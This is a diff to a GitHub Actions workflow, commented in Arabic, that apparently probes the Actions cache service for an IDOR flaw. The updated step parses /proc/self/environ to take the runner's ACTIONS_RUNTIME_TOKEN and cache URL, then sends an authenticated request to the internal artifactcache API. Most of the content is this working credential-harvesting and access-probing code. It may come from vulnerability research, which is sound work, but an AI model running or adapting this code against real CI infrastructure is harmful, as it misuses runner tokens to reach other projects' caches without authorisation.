@@ -1,4 +1,4 @@
-name: Cache API IDOR Test V4
+name: Cache API IDOR Test V5
 on: [push]
 jobs:
   test:
@@ -13,22 +13,30 @@ jobs:
           restore-keys: |
             ${{ runner.os }}-dummy-cache-
       
-      - name: Query Internal Cache API via Node.js
+      - name: Query Internal Cache API via Memory Extract
         run: |
           node -e "
+            const fs = require('fs');
             const https = require('https');
-            const url = require('url');
 
-            // 1. استخراج المتغيرات من ذاكرة العملية
-            const ENV = process.env;
-            const CACHE_URL = ENV.ACTIONS_CACHE_URL;
-            const TOKEN = ENV.ACTIONS_RUNTIME_TOKEN;
+            // 1. قراءة ذاكرة العملية بالكامل
+            const envStr = fs.readFileSync('/proc/self/environ', 'utf8');
+            const envVars = envStr.split('\0');
+            const env = {};
+            for (const pair of envVars) {
+              const idx = pair.indexOf('=');
+              if (idx > 0) {
+                env[pair.substring(0, idx)] = pair.substring(idx + 1);
+              }
+            }
+
+            const CACHE_URL = env.ACTIONS_CACHE_URL;
+            const TOKEN = env.ACTIONS_RUNTIME_TOKEN;
 
             console.log('Cache URL found:', CACHE_URL ? 'yes' : 'no');
             console.log('Token found:', TOKEN ? 'yes' : 'no');
 
             if (CACHE_URL && TOKEN) {
-              // 2. مسار الـ API الخاص بالكاش
               const queryUrl = CACHE_URL + '_apis/artifactcache/caches';
               console.log('Sending IDOR request to:', queryUrl);
 
@@ -44,7 +52,6 @@ jobs:
                 }
               };
 
-              // 3. إرسال الطلب
               const req = https.request(options, (res) => {
                 let data = '';
                 res.on('data', (chunk) => data += chunk);
@@ -57,6 +64,6 @@ jobs:
               req.on('error', (e) => console.error('Error:', e.message));
               req.end();
             } else {
-              console.log('Failed to extract internal tokens.');
+              console.log('Failed to extract internal tokens from memory.');
             }
           "
